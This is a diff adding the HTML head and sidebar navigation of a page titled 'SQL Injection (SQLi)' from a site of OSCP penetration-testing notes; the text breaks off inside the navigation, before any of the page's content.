@@ -1,0 +1,2248 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://an4kein.github.io/oscp-notes/enumeration/web_attacks/sqli/">
+      
+      
+        <link rel="prev" href="../session-fixation/">
+      
+      
+        <link rel="next" href="../ssrf/">
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.9">
+    
+    
+      
+        <title>SQL Injection (SQLi) - OSCP Notes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.4af4bdda.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../custom.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="cyan">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#sqli" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../.." title="OSCP Notes" class="md-header__button md-logo" aria-label="OSCP Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            OSCP Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              SQL Injection (SQLi)
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+    
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/an4kein/oscp-notes" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../files/" class="md-tabs__link">
+          
+  
+    
+  
+  Enumeration
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../exploitation/payloads/" class="md-tabs__link">
+          
+  
+    
+  
+  Exploitation
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../post_exploitation/linux/" class="md-tabs__link">
+          
+  
+    
+  
+  Post Exploitation
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../oscp_tips/" class="md-tabs__link">
+        
+  
+    
+  
+  OSCP Tips
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../about/" class="md-tabs__link">
+        
+  
+    
+  
+  About
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="OSCP Notes" class="md-nav__button md-logo" aria-label="OSCP Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    OSCP Notes
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/an4kein/oscp-notes" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    Enumeration
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Enumeration
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../files/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Files
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ssl_tls/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSL/TLS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ports/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Ports
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" checked>
+        
+          
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  <span class="md-ellipsis">
+    Web Attacks
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_4" id="__nav_2_4_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_4">
+            <span class="md-nav__icon md-icon"></span>
+            Web Attacks
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../general-info/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    General Info
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../quick-tricks/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Quick Tricks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../open-redirects/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Open Redirects
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../broken-links/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Broken Links
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../parameter-pollution/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Parameter Pollution
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../bruteforcing/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Bruteforcing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../pastejacking/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Pastejacking
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../clickjacking/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Clickjacking
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../prototype-pollution/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Prototype Pollution
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../command-injection/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Command Injection
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cookie-padding/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Cookie Padding
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../cors/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CORS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../crawl-fuzz/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Crawl & Fuzz
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../crlf/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CRLF Injection
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../csp/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CSP (Content Security Policy)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../csrf/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CSRF (Cross-Site Request Forgery)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../deserialization/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Deserialization Attacks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../dns-rebinding/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    DNS Rebinding
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../email-attacks/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Email Attacks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../header-injections/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Header Injections
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../idor/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    IDOR (Insecure Direct Object References)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../lfi-rfi/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    LFI & RFI (Local & Remote File Inclusion)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../online-hashes-cracked/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Online Hashes Cracked
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../open-redirect/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Open Redirect
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../request-smuggling/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Request Smuggling
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../session-fixation/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Session Fixation
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    SQL Injection (SQLi)
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    SQL Injection (SQLi)
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#common" class="md-nav__link">
+    <span class="md-ellipsis">
+      Common
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#polyglot" class="md-nav__link">
+    <span class="md-ellipsis">
+      Polyglot
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#resources-by-type" class="md-nav__link">
+    <span class="md-ellipsis">
+      Resources by type
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rw-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      R/W files
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      Blind SQLi
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#second-order-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      Second Order SQLi
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sqlmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      sqlmap
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssrf/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSRF (Server-Side Request Forgery)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ssti/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    SSTI (Server-Side Template Injection)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../tabnabbing/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Tabnabbing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../upload-bypasses/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Upload Bypasses
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../vhosts/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Virtual Hosts Enumeration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web-cache-deception/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Cache Deception
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web-cache-poisoning/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Cache Poisoning
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web-shells/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Shells
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../web-sockets/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Sockets
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../xss/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    XSS (Cross-Site Scripting)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../xxe/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    XXE (XML External Entity)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Exploitation
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Exploitation
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../exploitation/payloads/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Payloads
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../exploitation/reverse_shells/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Reverse Shells
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../exploitation/file_transfer/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    File Transfer
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_4" id="__nav_3_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Code Execution
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4">
+            <span class="md-nav__icon md-icon"></span>
+            Code Execution
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../exploitation/code_execution/linux/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Linux Snippets
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../exploitation/code_execution/windows/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Windows Snippets
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../exploitation/code_execution/web/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Web Snippets
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+      
